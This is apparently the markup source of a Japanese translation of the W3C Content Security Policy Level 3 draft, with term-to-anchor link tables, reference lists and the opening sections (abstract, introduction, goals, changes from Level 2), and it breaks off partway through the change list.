	dir.plugin-types:#plugin-types
	dir.prefetch-src:#prefetch-src
	dir.report-uri:#report-uri
	dir.report-to:#report-to
	dir.sandbox:#sandbox
	dir.script-src:#script-src
	dir.style-src:#style-src
	dir.navigate-to:#navigate-to


	dir.block-all-mixed-content
	dir.base-uri
	dir.form-action
	dir.frame-ancestors
	dir.plugin-types
	dir.sandbox
	dir.disown-opener

dir.block-all-mixed-content:~MIXED-CONTENT#block-all-mixed-content
dir.upgrade-insecure-requests:~UPGRADE-INSECURE-REQUESTS#upgrade-insecure-requests
dir.require-sri-for:https://w3c.github.io/webappsec-subresource-integrity/#require-sri-for
	~SRI1#require-sri-for



	●attr／elem
a.content:~HEmetadata#attr-meta-content
a.data:~HEembed#attr-object-data
a.href:~HEmetadata#attr-base-href
a.http-equiv:~HEmetadata#attr-meta-http-equiv
a.sandbox:~HEembed#attr-iframe-sandbox
a.type:~HEembed#attr-embed-type
a.nonce:~HTMLurl#attr-nonce

e.a:~HEtextlevel#the-a-element
e.applet:~HTMLobs#applet
e.base:~HEmetadata#the-base-element
e.embed:~HEembed#the-embed-element
e.form:~HEforms#the-form-element
e.iframe:~HEembed#the-iframe-element
e.link:~HEmetadata#the-link-element
e.meta:~HEmetadata#the-meta-element
	#meta
e.object:~HEembed#the-object-element
e.script:~HEscripting#the-script-element
	#script
e.style:~HEmetadata#the-style-element
e.frame:~HTMLobs#frame

	●header
h.Content-Security-Policy:#header-content-security-policy
h.Content-Security-Policy-Report-Only:#header-content-security-policy-report-only
h.Link:~HTTPweblink#section-3
	h.Link:~IETF/rfc5988#section-5

l.parser-inserted:~HEscripting#parser-inserted


	●

~CSP:#content-security-policy
gO.~CSP~list:#global-object-csp-list
~CSP~list:#csp-list

埋込んでいる文書:#embedding-document
施行-:#enforced
施行され:#enforced
監視-:#monitored
監視され:#monitored
処置先:#policy-disposition
~source:#policy-source
~source式:#source-expression
~source~list:#source-lists

指令:#directives
有効な指令:#request-effective-directive
指令~集合:#policy-directive-set
~fetch指令:#fetch-directives
値:#directive-value

名前:#directive-name
施策:#content-security-policy-object
直列形の~source~list:#serialized-source-list
直列形の指令:#serialized-directive
直列形の~CSP:#serialized-csp
直列形の~CSP~list:#serialized-csp-list
直列化-:#serialized-csp

すべての~inlineの挙動を許容する:#source-list-allows-all-inline-behavior
~headerにより送達された~CSPを包含して:#contains-a-header-delivered-content-security-policy
~ABNF:#biblio-rfc5234

違反:#violation
報告:#reports
報告先:~REPORTING#endpoint
	#directive-report-uri
報告先~group:~REPORTING#endpoint-group
	https://mikewest.github.io/error-reporting/#group
	端点:https://w3c.github.io/reporting/#endpoint

違反~報告:#violation-report
vr.~referrer:#violation-referrer
vr.~source~file:#violation-source-file
vr.~url:#violation-url
vr.大域~obj:#violation-global-object
vr.施策:#violation-policy
vr.有効な指令:#violation-effective-directive
vr.処置先:#violation-disposition
vr.状態code:#violation-status
vr.資源:#violation-resource
vr.列番号:#violation-column-number
vr.行番号:#violation-line-number
vr.要素:#violation-element
vr.見本:#violation-sample


	●演算
A.要請前~検査:#directive-pre-request-check
A.要請後~検査:#directive-post-request-check
A.応答~検査:#directive-response-check
A.~inline検査:#directive-inline-check
A.初期化:#directive-initialization
A.~navi前~検査:#directive-pre-navigation-check
A.~navi応答~検査:#directive-navigation-response-check

構文解析-:#parse-serialized-policy
	＊？~TR/CSP3/#parse-serialized-policy

A.直列形の~CSPを構文解析する:#abstract-opdef-parse-a-serialized-csp
A.直列形の~CSP~listを構文解析する:#abstract-opdef-parse-a-serialized-csp-list
A1.新たな違反~obj:#create-violation-for-global
A.新たな違反~obj:#create-violation-for-request
	＊A1.違反~objを作成-:#create-violation-for-global
	＊A.違反~objを作成-:#create-violation-for-request
A.応答の~CSP~listを設定する:#set-response-csp-list
A.要請は~CSPにより阻止されるべきか？:#should-block-request
A.要請に対する応答は~CSPにより阻止されるべきか？:#should-block-response
A.大域~objの~CSP~listを初期化する:#initialize-global-object-csp
A.~objの~CSP~listを得る:#get-csp-of-object
A.要素における~inline型の挙動は~CSPにより阻止されるべきか？:#should-block-inline

A.~sourceから~targetを~navigateするある種別の要請は~CSPにより阻止されるべきか？:#should-block-navigation-request
A.~sourceから~targetを~navigateするある種別の要請に対する応答は~CSPにより阻止されるべきか？:#should-block-navigation-response

A.直列化-（非推奨）:#deprecated-serialize-violation
A.違反を報告する:#report-violation
	＊A.~CSP指令:#csp-directives

A.要請は施策に違反するか？:#does-request-violate-policy
A.~nonceは~source~listに合致するか？:#match-nonce-to-source-list
A.要請は~source~listに合致するか？:#match-request-to-source-list
A.要請に対する応答は~source~listに合致するか？:#match-response-to-source-list
A.~urlは ( 生成元, ~redirect回数 ) について~source~listに合致するか？:#match-url-to-source-list
A.~urlは ( 生成元, ~redirect回数 ) について式に合致するか？:#match-url-to-source-expression
A.有効な指令を取得-:#effective-directive-for-a-request
	要請に対する有効な指令を取得する
A.~scheme成分は合致するか？:#scheme-part-match
A.~host成分は合致するか？:#host-part-match
A.~port成分は合致するか？:#port-part-matches
A.~path成分は合致するか？:#path-part-match
A.要素は~nonce可能か？:#is-element-nonceable
A.~source~listは型に対するすべての~inlineの挙動を許容するか？:#allow-all-inline
A.要素 は ( 型, ~source ) について~source~listに合致するか？:#match-element-to-source-list
A.文書の~CSP~listを初期化する:#initialize-document-csp
A.報告先~group用に~dataを~queueする:~REPORTING#queue-report
	https://w3c.github.io/reporting/#queue-report
	https://mikewest.github.io/error-reporting/#queue-report


~Fetchとの統合:#fetch-integration
~HTMLとの統合:#html-integration
	§:#csp-header
	§:#cspro-header
	§:#meta-element
	§:#allow-base-for-document
	§:#multiple-policies

	●JS
jA.HostEnsureCanCompileStrings:~TC39#sec-hostensurecancompilestrings

~realm:~TC39#realm
c.Function():~TC39#sec-function-objects
c.JSON.stringify():~TC39#sec-json.stringify
c.eval():~TC39#sec-eval-x

	●INFRA
文字列:~INFRA#string
~ASCII大小無視:~INFRA#ascii-case-insensitive
~ACI:#_ascii-case_insensitive
~ASCII小文字~化する:~INFRA#ascii-lowercase
~ASCII文字列:~INFRA#ascii-string
~ASCII空白で分割する:~INFRA#split-on-ascii-whitespace
~commaで分割する:~INFRA#split-on-commas
区切子で厳密に分割する:~INFRA#strictly-split
同型に復号-:~INFRA#isomorphic-decode

~list:~INFRA#list
~IN:~INFRA#list-contain
包含して:~INFRA#list-contain
~size:~INFRA#list-size
付加する:~INFRA#list-append
有順序~集合:~INFRA#ordered-set
set.付加する:~INFRA#set-append
空である:~INFRA#is-empty

	＊？contains:~INFRA#map-exists
	＊不要
	~case-sensitive:~HTMLINFRA#case-sensitive
	前後の~ASCII空白~列を剥ぐ:~INFRA#strip-leading-and-trailing-ascii-whitespace
	符号位置~並びを収集-:~INFRA#collect-a-sequence-of-code-points
	~ASCII空白:~INFRA#ascii-whitespace

~fallback基底~URL:~HTMLurl#fallback-base-url


	●URL1
~URL:~URL1#url
基底~URL:~URL1#concept-base-url
~URL構文解析する:~URL1#concept-url-parser
~URLを直列化する:~URL1#concept-url-serializer
~IPv6~address:~URL1#concept-ipv6
既定~port:~URL1#default-port
~byte列を~byte列に~percent-復号する:~URL1#percent-decode

url.生成元:~URL1#concept-url-origin
url.~host:~URL1#concept-url-host
	＊？#dom-url-host
url.~path:~URL1#concept-url-path
url.~port:~URL1#concept-url-port
	＊？#dom-url-port
url.~scheme:~URL1#concept-url-scheme

	●fetch
~network~scheme:~FETCH#network-scheme
局所~scheme:~FETCH#local-scheme
~fetch:~FETCH#concept-fetch
~HTTP~fetch:~FETCH#concept-http-fetch
~HTTP-network~fetch:~FETCH#concept-http-network-fetch
~main~fetch:~FETCH#main-fetch
~header~list:~FETCH#concept-header-list
~network~error:~FETCH#concept-network-error
A.~header~listから値を抽出する:~FETCH#extract-header-list-values
A.~MIME型を抽出する:~FETCH#concept-header-extract-mime-type

~redirect~status:~FETCH#redirect-status

応答:~FETCH#concept-response
rs.~CSP~list:~FETCH#concept-response-csp-list
rs.~header~list:~FETCH#concept-response-header-list
rs.~url:~FETCH#concept-response-url
rs.~status:~FETCH#concept-response-status

要請:~FETCH#concept-request
rq.本体:~FETCH#concept-request-body
rq.~client:~FETCH#concept-request-client
rq.資格証~mode:~FETCH#concept-request-credentials-mode
rq.~keepalive~flag:~FETCH#request-keepalive-flag
rq.現在の~url:~FETCH#concept-request-current-url
rq.行先:~FETCH#concept-request-destination
rq.~header~list:~FETCH#concept-request-header-list
rq.起動元:~FETCH#concept-request-initiator
rq.~method:~FETCH#concept-request-method
rq.生成元:~FETCH#concept-request-origin
rq.~redirect~mode:~FETCH#concept-request-redirect-mode
rq.~mode:~FETCH#concept-request-mode
rq.~url:~FETCH#concept-request-url
rq.~window:~FETCH#concept-request-window
rq.~target閲覧文脈:#concept-request-target-browsing-context
	＊~FETCH#concept-request-target-browsing-context
rq.~target~client~id:~FETCH#concept-request-target-client-id
rq.暗号用~nonce~metadata:~FETCH#concept-request-nonce-metadata
rq.構文解析器~metadata:~FETCH#concept-request-parser-metadata
rq.完全性~metadata:~FETCH#concept-request-integrity-metadata
rq.~redirect回数:~FETCH#concept-request-redirect-count
~scriptに類する:~FETCH#request-destination-script-like

~CSS規則を挿入する:~CSSOM1#insert-a-css-rule
~CSS規則として構文解析する:~CSSOM1#parse-a-css-rule
選択子~listとして構文解析する:~CSSOM1#parse-a-group-of-selectors
~CSS宣言~blockを構文解析する:~CSSOM1#parse-a-css-declaration-block


	●HTML
閲覧文脈:~BROWSERS#browsing-context
属する閲覧文脈:~BROWSERS#concept-document-bc
親~閲覧文脈:~BROWSERS#parent-browsing-context
先祖~閲覧文脈:~BROWSERS#ancestor-browsing-context
入子の閲覧文脈:~BROWSERS#nested-browsing-context
開いた閲覧文脈:~BROWSERS#opener-browsing-context
通して入子に:~BROWSERS#browsing-context-nested-through
作動中の文書:~BROWSERS#active-document
未所有化~flag:~BROWSERS#disowned-its-opener
結付けられている文書:~WINDOW#concept-document-window

生成元:~ORIGIN#concept-origin
o.~scheme:~ORIGIN#concept-origin-scheme
生成元を直列化する:~ORIGIN#ascii-serialisation-of-an-origin
~sandbox法~指令を構文解析-:~ORIGIN#parse-a-sandboxing-directive
強制~sandbox法~flag集合:~ORIGIN#forced-sandboxing-flag-set
閲覧文脈~sandbox化( 生成元 )~flag:~ORIGIN#sandboxed-origin-browsing-context-flag
閲覧文脈~sandbox化( ~script )~flag:~ORIGIN#sandboxed-scripts-browsing-context-flag

A.~navigate応答を処理する:~NAVI#process-a-navigate-response
A.~navigate~fetchを処理する:~NAVI#process-a-navigate-fetch
新たな文書~objを初期化する:~NAVI#initialise-the-document-object
~plugin文書:~NAVI#plugin-document

~iframe-srcdoc文書:~HEembed#an-iframe-srcdoc-document
	~HTMLparsing#parse-error-duplicate-attribute
	＊~WAPI#concept-script-parse-error → HTMLparsing#parse-errors？

~workerを走らす:~WORKERS#run-a-worker
文書~list:~WORKERS#the-worker's-documents
	'
所有者~集合:~WORKERS#concept-WorkerGlobalScope-owner-set
所有者~文書:WORKLET1#workletglobalscope-owner-document

~taskを~queueする:~WAPI#queue-a-task
関連する設定群~obj:~WAPI#relevant-settings-object
関連する大域~obj:~WAPI#concept-relevant-global
現在の設定群~obj:~WAPI#current-settings-object
大域~obj:~WAPI#global-object
rM.大域~obj:~WAPI#concept-realm-global
enV.大域~obj:~WAPI#concept-settings-object-global
enV.生成元:~WAPI#concept-settings-object-origin
enV.担当の閲覧文脈:~WAPI#responsible-browsing-context

~event~handler内容~属性:~WAPI#event-handler-content-attributes

~at_import:~CASCADE#at-ruledef-import

~node文書:~DOM4#concept-node-document
~eventを発火する:~DOM4#concept-event-fire
~shadowも含む根:~DOM4#concept-shadow-including-root
接続されて:~DOM4#connected

doc.~CSP~list:~HTMLdom#concept-document-csp-list

~CSP状態 http-equiv 処理命令:~HEmetadata#attr-meta-http-equiv-content-security-policy
凍結~基底~URLを設定する:~HEmetadata#set-the-frozen-base-url
~style~blockを更新する:~HEmetadata#update-a-style-block

構文解析-時に挿入され:~HEscripting#parser-inserted
~scriptを準備する:~HEscripting#prepare-a-script

表現:~RFC7231#section-3
資源~表現:~RFC7231#section-3
妥当な~MIME型:~MIMESNIFF#valid-mime-type

~metadataを構文解析-:~SRI1#parse-metadata
	https://www.w3.org/TR/SRI/#parse-metadata
	https://w3c.github.io/webappsec-subresource-integrity/#parse-metadata

~HTTP状態code:~RFC7231#section-6
~HTTP要請
~HTTP応答~header


●●ref_normative

[CSP-3]
    Content Security Policy Level 3 URL: https://www.w3.org/TR/CSP3/ 
[CSS-CASCADE-4]
    Elika Etemad; Tab Atkins Jr.. CSS Cascading and Inheritance Level 4. 14 January 2016. CR. URL: https://www.w3.org/TR/css-cascade-4/ 
[CSSOM]
    Simon Pieters; Glenn Adams. CSS Object Model (CSSOM). 17 March 2016. WD. URL: https://www.w3.org/TR/cssom-1/ 
[DOM]
    Anne van Kesteren. DOM Standard. Living Standard. URL: https://dom.spec.whatwg.org/ 
[ECMA262]
    Brian Terlson; Allen Wirfs-Brock. ECMAScript® Language Specification. URL: https://tc39.github.io/ecma262/ 
[FETCH]
    Anne van Kesteren. Fetch Standard. Living Standard. URL: https://fetch.spec.whatwg.org/ 
[HTML]
    Anne van Kesteren; et al. HTML Standard. Living Standard. URL: https://html.spec.whatwg.org/multipage/ 
[INFRA]
    Anne van Kesteren; Domenic Denicola. Infra Standard. Living Standard. URL: https://infra.spec.whatwg.org/ 
[MIMESNIFF]
    Gordon P. Hemsley. MIME Sniffing Standard. Living Standard. URL: https://mimesniff.spec.whatwg.org/ 
[REPORTING]
    Ilya Gregorik; Mike West. Reporting API. URL: https://wicg.github.io/reporting/ 
[RFC2045]
    N. Freed; N. Borenstein. Multipurpose Internet Mail Extensions (MIME) Part One: Format of Internet Message Bodies. November 1996. Draft Standard. URL: https://tools.ietf.org/html/rfc2045 
[RFC2119]
    S. Bradner. Key words for use in RFCs to Indicate Requirement Levels. March 1997. Best Current Practice. URL: https://tools.ietf.org/html/rfc2119 
[RFC3492]
    A. Costello. Punycode: A Bootstring encoding of Unicode for Internationalized Domain Names in Applications (IDNA). March 2003. Proposed Standard. URL: https://tools.ietf.org/html/rfc3492 
[RFC3864]
    G. Klyne; M. Nottingham; J. Mogul. Registration Procedures for Message Header Fields. September 2004. Best Current Practice. URL: https://tools.ietf.org/html/rfc3864 
[RFC3986]
    T. Berners-Lee; R. Fielding; L. Masinter. Uniform Resource Identifier (URI): Generic Syntax. January 2005. Internet Standard. URL: https://tools.ietf.org/html/rfc3986 
[RFC4648]
    S. Josefsson. The Base16, Base32, and Base64 Data Encodings. October 2006. Proposed Standard. URL: https://tools.ietf.org/html/rfc4648 
[RFC5234]
    D. Crocker, Ed.; P. Overell. Augmented BNF for Syntax Specifications: ABNF. January 2008. Internet Standard. URL: https://tools.ietf.org/html/rfc5234 
[RFC7034]
    D. Ross; T. Gondrom. HTTP Header Field X-Frame-Options. October 2013. Informational. URL: https://tools.ietf.org/html/rfc7034 
[RFC7230]
    R. Fielding, Ed.; J. Reschke, Ed.. Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing. June 2014. Proposed Standard. URL: https://tools.ietf.org/html/rfc7230 
[RFC7231]
    R. Fielding, Ed.; J. Reschke, Ed.. Hypertext Transfer Protocol (HTTP/1.1): Semantics and Content. June 2014. Proposed Standard. URL: https://tools.ietf.org/html/rfc7231 
[RFC7762]
    M. West. Initial Assignment for the Content Security Policy Directives Registry. January 2016. Informational. URL: https://tools.ietf.org/html/rfc7762 
[RFC8288]
    M. Nottingham. Web Linking. October 2017. Proposed Standard. URL: https://tools.ietf.org/html/rfc8288 
[SERVICE-WORKERS-2]
    Service Workers URL: https://w3c.github.io/ServiceWorker/ 
[SHA2]
    FIPS PUB 180-4, Secure Hash Standard. URL: https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf 
[SRI]
    Devdatta Akhawe; et al. Subresource Integrity. 23 June 2016. REC. URL: https://www.w3.org/TR/SRI/ 
[URL]
    Anne van Kesteren. URL Standard. Living Standard. URL: https://url.spec.whatwg.org/ 
[WebIDL]
    Cameron McCormack; Boris Zbarsky; Tobie Langel. Web IDL. 15 December 2016. ED. URL: https://heycam.github.io/webidl/ 
[WORKLETS-1]
    Ian Kilpatrick. Worklets Level 1. 7 June 2016. WD. URL: https://www.w3.org/TR/worklets-1/ 

●●ref_informative

[APPMANIFEST]
    Marcos Caceres; et al. Web App Manifest. 4 July 2018. WD. URL: https://www.w3.org/TR/appmanifest/ 
[BEACON]
    Ilya Grigorik; et al. Beacon. 13 April 2017. CR. URL: https://www.w3.org/TR/beacon/ 
[CSP2]
    Mike West; Adam Barth; Daniel Veditz. Content Security Policy Level 2. 15 December 2016. REC. URL: https://www.w3.org/TR/CSP2/ 
[CSS-ABUSE]
    Chris Evans. Generic cross-browser cross-domain theft. 28 December 2009. URL: https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html 
[EVENTSOURCE]
    Ian Hickson. Server-Sent Events. 3 February 2015. REC. URL: https://www.w3.org/TR/eventsource/ 
[FILEDESCRIPTOR-2015]
    filedescriptor. CSP 2015. 23 November 2015. URL: https://blog.innerht.ml/csp-2015/#danglingmarkupinjection 
[H5SC3]
    Mario Heiderich. H5SC Minichallenge 3: "Sh*t, it's CSP!". URL: https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22 
[HTML-DESIGN]
    Anne Van Kesteren; Maciej Stachowiak. HTML Design Principles. URL: https://www.w3.org/TR/html-design-principles/ 
[MIX]
    Mike West. Mixed Content. 2 August 2016. CR. URL: https://www.w3.org/TR/mixed-content/ 
[TIMING]
    Paul Stone. Pixel Perfect Timing Attacks with HTML5. URL: https://www.contextis.com/media/downloads/Pixel_Perfect_Timing_Attacks_with_HTML5_Whitepaper.pdf 
[UISECURITY]
    Brad Hill. User Interface Security and the Visibility API. 7 June 2016. WD. URL: https://www.w3.org/TR/UISecurity/ 
[UPGRADE-INSECURE-REQUESTS]
    Mike West. Upgrade Insecure Requests. 8 October 2015. CR. URL: https://www.w3.org/TR/upgrade-insecure-requests/ 
[WEBSOCKETS]
    Ian Hickson. The WebSocket API. 20 September 2012. CR. URL: https://www.w3.org/TR/websockets/ 
[XHR]
    Anne van Kesteren. XMLHttpRequest Standard. Living Standard. URL: https://xhr.spec.whatwg.org/ 
[XSLT]
    James Clark. XSL Transformations (XSLT) Version 1.0. 16 November 1999. REC. URL: https://www.w3.org/TR/xslt/ 


●●trans_metadata
<p>
~THIS_PAGEは、~W3Cにより編集者草案として公開された
<a href="~SPEC_URL">Content Security Policy Level 3</a>
を日本語に翻訳したものです。
~PUB
</p>

●●spec_metadata

最新発行バージョン
	https://www.w3.org/TR/CSP3/

編集者草案
	https://w3c.github.io/webappsec-csp/

以前のバージョン
	https://www.w3.org/TR/2016/WD-CSP3-20160913/

バージョン履歴
	https://github.com/w3c/webappsec-csp/commits/master/index.src.html

フィードバック
	<a href="mailto:public-webappsec@w3.org?subject=%5BCSP3%5D%20YOUR%20TOPIC%20HERE">public-webappsec@w3.org</a> with subject line “<kbd>[CSP3] <i data-lt="">… message topic …</i></kbd>” (<a href="https://lists.w3.org/Archives/Public/public-webappsec/" rel="discussion">archives</a>)

編集
	<a href="mailto:mkwst@google.com">Mike West</a> (Google Inc.)

Participate:
	<a href="https://github.com/w3c/webappsec-csp/issues/new">File an issue</a> (<a href="https://github.com/w3c/webappsec-csp/issues">open issues</a>)

Tests:
	<a href="https://github.com/web-platform-tests/wpt/tree/master/content-security-policy">web-platform-tests content-security-policy/</a> (<a href="https://github.com/web-platform-tests/wpt/labels/content-security-policy">ongoing work</a>)

</script>


</head>

<body>

<header>

	<hgroup>
<h1 id="title">Content Security Policy Level 3</h1>
	</hgroup>
</header>

<div id="MAIN" style="display:none;">

	<section id="abstract">
<h2 title="Abstract">要約</h2>

<p>
この文書は、特定0の~pageが どの資源を~fetchあるいは実行できるか，および
保安に関連する数々の施策~裁定について，~web開発者が制御できる仕組みを定義する。
◎
This document defines a mechanism by which web developers can control the resources which a particular page can fetch or execute, as well as a number of security-relevant policy decisions.
</p>


	</section>
	<section id="status">
<h2 title="Status of this document">この文書の位置付け</h2>

<p>
<!-- 
この節では、発行時点における…
-->
これは編集者草案の~~公開の複製です…
【以下、この節の他の内容は <a href="w3c-common-ja.html#status" >W3C 日本語訳 共通ページ</a>に委譲。】
</p>

<p>
<strong>
この文書に対する変更点は、
<a href="https://github.com/w3c/webappsec">https://github.com/w3c/webappsec</a>
にて追跡できます。
</strong>
◎
Changes to this document may be tracked at https://github.com/w3c/webappsec.
</p>

<p>
この文書は、
<a href="http://www.w3.org/2011/webappsec/">Web Application Security Working Group</a>
により制作されました。
◎
This document was produced by the Web Application Security Working Group.
</p>


<p>
次の特色機能は
<a href="w3c-common-ja.html#at-risk">~risk下</a>
にあり，勧告候補の期間~中に取下げらるかもしれません：
◎
The following features are at-risk, and may be dropped during the CR period:
</p>

<ul>
	<li>
`要素は~nonce可能か？$A
~algo
◎
The §6.6.2.1 Is element nonceable? algorithm. 
</li>
</ul>


	</section>

<main id="MAIN0">

	<section id="intro">
<h2 title="Introduction">1. 序論</h2>

~INFORMATIVE

<p>
この文書は、
`Content Security Policy^en  （
“内容~保安~施策”, または単に “施策”
）
— 略して
`~CSP@ †
—
を定義する。
それは、開発者が自身の~appを種々の仕方で監禁して，［
~XSS（ `cross-site scripting^en ）などによる内容~注入~脆弱性の~riskを軽減する ／ ~appを実行する際に用いる特権を抑制する
］ために利用できる~toolである。
◎
This document defines Content Security Policy (CSP), a tool which developers can use to lock down their applications in various ways, mitigating the risk of content injection vulnerabilities such as cross-site scripting, and reducing the privilege with which their applications execute.
</p>

<p class="trans-note">【
この訳では、原文の［
“`Content Security Policy^en” ／
“`content security policy^en” ／
“`CSP^en”
］を，一律に~CSPと記すことにする。
】</p>

<p>
~CSPは、内容~注入~脆弱性に抗する前線防御（ `first line of defense^en ）として意図されたものではなく、多層防御（ `defense-in-depth^en ）としての利用に最も適する。
【すなわち、注入そのものを防ぐのでなく，注入されたものが効果を及ぼすのを防ぐ。】
それは、悪意的な注入により生じ得る被害を抑制するが、外からの入力に対する注意深い検証や，出力の安全な形への符号化-
【すなわち，前線防御】
の代用になるものではない。
◎
CSP is not intended as a first line of defense against content injection vulnerabilities. Instead, CSP is best used as defense-in-depth. It reduces the harm that a malicious injection can cause, but it is not a replacement for careful input validation and output encoding.
</p>

<div class="p">
<p>
この文書は，~CSP Level 2 の繰り返しであるが、次の二点を目標にしている：
</p>

<ul>
	<li>
CSP, ~HTML, ~Fetch
間の相互作用を より明確に説明する。
</li>
	<li>
~modularに拡張するための明確な各種~hookを供する。
</li>
</ul>

<p>
これは、理想的には、安定的な中核を形成して，その上に新たな機能性を築けるようにする。
</p>

◎
This document is an iteration on Content Security Policy Level 2, with the goal of more clearly explaining the interactions between CSP, HTML, and Fetch on the one hand, and providing clear hooks for modular extensibility on the other. Ideally, this will form a stable core upon which we can build new functionality.
</div>

		<section id="examples">
<h3 title="Examples">1.1. 例</h3>

			<section id="example-basic">
<h4 title="Control Execution">1.1.1. 実行~制御</h4>

<div class="example">

<p>
MegaCorp Inc の~web開発者たちは、~XSS攻撃に抗して保護することが求められているとする。
彼らが信用する CDN の生成元から読込まれる~scriptのみ，実行-可能にすることにより、~script注入による~riskを軽減できる。
加えて、彼らの~pageの文脈~下では，どの~pluginも実行させなくしたいとする。
そのような効果は、次の施策で得られる：
◎
MegaCorp Inc’s developers want to protect themselves against cross-site scripting attacks. They can mitigate the risk of script injection by ensuring that their trusted CDN is the only origin from which script can load and execute. Moreover, they wish to ensure that no plugins can execute in their pages' contexts. The following policy has that effect:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `script-src$dir https://cdn.example.com/scripts/;
    `object-src$dir `none$pl
</pre>

<p class="trans-note">【
長い行を~page横幅に収める都合により, あるいは読みやすくするため、この訳~全体を通して， HTTP ~headerの例示~codeでは、長い行は折り返した上で，字下げした形で示す
— HTTP/1.1 の構文としては、折返しは許容されないことに注意。
】</p>

</div>



			</section>
		</section>
		<section id="goals">
<h3 title="Goals">1.2. 目標</h3>

<p>
~CSPが目指すものは：
◎
Content Security Policy aims to do to a few related things:
</p>

<ol>
	<li>
<p>
内容~注入~攻撃による~riskを軽減するような，次についての相応に細かい制御を、~web開発者に与える：
◎
Mitigate the risk of content-injection attacks by giving developers fairly granular control over
</p>
		<ul>
			<li>
特定の `文書$ や `Worker$I が，それ自身のために どの資源を要請できるか（および，後続して 自身に埋込めるか／実行できるか）について。
◎
The resources which can be requested (and subsequently embedded or executed) on behalf of a specific Document or Worker
</li>
			<li>
~inline~scriptの実行。
◎
The execution of inline script
</li>
			<li>
動的な（ `eval()^c その他の類似する構成子を介する）~code実行。
◎
Dynamic code execution (via eval() and similar constructs)
</li>
			<li>
~inline~styleの適用。
◎
The application of inline style
</li>
		</ul>
	</li>
	<li>
［
どの生成元が，所与の資源を埋込めるか
］についての細かい制御を ~web開発者に与えて、［
資源が悪意的な文脈~内に埋込まれることを要するような攻撃（ `TIMING$r に述べられた “`Pixel Perfect^en” 攻撃, 等々）
］による~riskを軽減する。
◎
Mitigate the risk of attacks which require a resource to be embedded in a malicious context (the "Pixel Perfect" attack described in [TIMING], for example) by giving developers granular control over the origins which can embed a given resource.
</li>
	<li>
［
開発者が自身の~appの特権を抑制できるようにする
］ための，施策の枠組みを供する。
◎
Provide a policy framework which allows developers to reduce the privilege of their applications.
</li>
	<li>
［
~~外から悪用されている欠陥を，~web開発者が検出できるようにする
］ための，報告-法の仕組みを供する。
◎
Provide a reporting mechanism which allows developers to detect flaws being exploited in the wild.
</li>
</ol>



		</section>
		<section id="changes-from-level-2">
<h3 title="Changes from Level 2">1.3. ~level 2 からの変更点</h3>

<p>
この文書は、~CSP Level 2 仕様からの発展を述べる。
`CSP2$r からの変更点についての，高次からの概観は：
◎
This document describes an evolution of the Content Security Policy Level 2 specification [CSP2]. The following is a high-level overview of the changes:
</p>

<ol>
	<li>
仕様は、他の仕様（特に Service Worker ）が，~CSPの各種 要件と制約を より単純に統合できるようにすべく、
`FETCH$r 仕様の用語を通して，~~土台から書き直された。
◎
The specification has been rewritten from the ground up in terms of the [FETCH] specification, which should make it simpler to integrate CSP’s requirements and restrictions with other specifications (and with Service Workers in particular).
</li>
	<li>
<p>
`child-src$dir ~modelは、かなり改められた：
◎
The child-src model has been substantially altered:
</p>
		<ul>
			<li>
CSP Level 2 で非推奨にされた `frame-src$dir 指令は，非推奨でなくなったが、無い場合は `child-src$dir に先送りされ続ける（それも無い場合は `default-src$dir に先送りされる）。
◎
The frame-src directive, which was deprecated in CSP Level 2, has been undeprecated, but continues to defer to child-src if not present (which defers to default-src in turn).
</li>
			<li>
`worker-src$dir 指令が追加され、無い場合は `child-src$dir に先送りされる（それも無い場合は，
`script-src$dir に, それも無い場合は `default-src$dir に先送りされる）。
◎
A worker-src directive has been added, deferring to child-src if not present (which likewise defers to script-src and eventually default-src).
</li>
			<li>
専用~workerは、今や常に，作成-元~の施策を継承する。
◎
Dedicated workers now always inherit their creator’s policy.
</li>
		</ul>
	</li>
	<li>
<p>
~URL照合~algoは、今や
非保安的［
~scheme／~port
］を その保安的~scheme版に合致するように扱う。
すなわち、`~source式$
`http://example.com:80^s
は
`http://example.com:80^s,
`https://example.com:443^s
の両者に合致することになる。
◎
The URL matching algorithm now treats insecure schemes and ports as matching their secure variants. That is, the source expression http://example.com:80 will match both http://example.com:80 and https://example.com:443.
</p>

<p>
同様に `self$pl は、
`http_^sc ~schemeの~page上であっても，［
~pageの生成元の~schemeを［
`https_^sc ／ `wss_^sc
］に置き換えた生成元
］にも合致するようにされた。
◎
Likewise, 'self' now matches https: and wss: variants of the page’s origin, even on pages whose scheme is http.
</p>
	</li>
<li>
~inline［
~script／~style
］から生成される違反~報告は、今や 阻止された`資源$vrとして `inline^l を報告するようになった。
同様に，阻止された `eval()^c 実行は、阻止された`資源$vrとして `eval^l を報告するようになった。
◎
Violation reports generated from inline script or style will now report "inline" as the blocked resource. Likewise, blocked eval() execution will report "eval" as the blocked resource.
</li>
	<li>
`manifest-src$dir 指令が追加された。
◎
The manifest-src directive has been added.
</li>
	<li>
新たな `report-to$dir 指令への支持を受けて、
`report-uri$dir 指令は非推奨にされた。
`report-to^dir は、基盤として `REPORTING$r に依拠する。
◎
The report-uri directive is deprecated in favor of the new report-to directive, which relies on [REPORTING] as infrastructure.
</li>
	<li>
`strict-dynamic^pl ~source式は、今や［
~page上で実行する~scriptが、`構文解析-時に挿入され$たものでない `script$e 要素を介して，更に~scriptを読込む
］ことを許容する。
詳細は、~strict-dynamic-usageに。
◎
The 'strict-dynamic' source expression will now allow script which executes on a page to load more script via non-"parser-inserted" script elements. Details are in §8.2 Usage of "'strict-dynamic'".
</li>
	<li>
`unsafe-hashes$pl ~source式は、今や［
~event~handler ／ ~style属性 ／ `javascript_^sc ~navi~target
］が，~hashに合致することを許容する。
詳細は、
<a href="#unsafe-hashes-usage">`unsafe-hashes^pl の用法</a>
節に。
◎
The 'unsafe-hashes' source expression will now allow event handlers, style attributes and javascript: navigation targets to match hashes. Details in §8.3 Usage of "'unsafe-hashes'".
</li>
	<li>
`~source式$の照合では、`局所~scheme$のみならず，被保護~資源の~schemeと同じでない どの非`~network~scheme$も，明示的に在することが要求されるようになった
— `~urlは ( 生成元, ~redirect回数 ) について式に合致するか？$A
を見よ。
◎
The source expression matching has been changed to require explicit presence of any non-network scheme, rather than local scheme, unless that non-network scheme is the same as the scheme of protected resource, as described in §6.6.1.6 Does url match expression in origin with redirect count?.
</li>
